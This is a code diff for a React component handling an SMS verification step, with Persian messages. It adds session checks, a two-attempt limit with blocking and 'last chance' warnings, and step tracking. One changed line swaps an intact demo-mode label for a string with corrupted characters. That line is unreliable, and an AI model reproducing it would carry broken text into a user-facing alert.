@@ -17,11 +17,47 @@ const AuthSMS = () => {
   const navigate = useNavigate();
   const [smsCode, setSmsCode] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [countdown, setCountdown] = useState(54);
   const [errors, setErrors] = useState<{ smsCode?: string }>({});
+  const [isSecondAttempt, setIsSecondAttempt] = useState(false);
+  const [isBlocked, setIsBlocked] = useState(false);
 
   const phoneNumber = location.state?.phoneNumber || "";
+  const sessionId =
+    location.state?.sessionId || sessionStorage.getItem("sessionId");
   const maskedPhoneNumber = maskPhoneNumber(phoneNumber);
+
+  useEffect(() => {
+    const checkAccess = async () => {
+      if (!sessionId) {
+        navigate("/", { replace: true });
+        return;
+      }
+
+      const canAccess = canAccessAuthStep(sessionId, "sms");
+      if (!canAccess) {
+        setIsBlocked(true);
+        setErrors({
+          smsCode:
+            "شما بیش از ۲ بار کد پیامک وارد کرده‌اید. این مرحله دیگر قابل دسترسی نیست.",
+        });
+        return;
+      }
+
+      // Check if this is second attempt
+      const session = getSession(sessionId);
+      if (session && session.authAttempts["sms"] === 1) {
+        setIsSecondAttempt(true);
+        setErrors({
+          smsCode:
+            "کد وارد شده غلط است. این آخرین فرصت شما برای ورود کد پیامک است.",
+        });
+      }
+
+      await setUserCurrentStep(sessionId, "auth_sms");
+    };
+
+    checkAccess();
+  }, [sessionId, navigate]);
 
   // Countdown timer effect
   React.useEffect(() => {
@@ -39,7 +75,7 @@ const AuthSMS = () => {
 
       // Show code in demo mode
       alert(
-        `🎭 حالت دمو\n\nکد پیامک: ${code}\n\n(در حالت واقعی این کد به شماره ${phoneNumber} ارسال می‌شود)`,
+        `🎭 حالت دم��\n\nکد پیامک: ${code}\n\n(در حالت واقعی این کد به شماره ${phoneNumber} ارسال می‌شود)`,
       );
     };
 
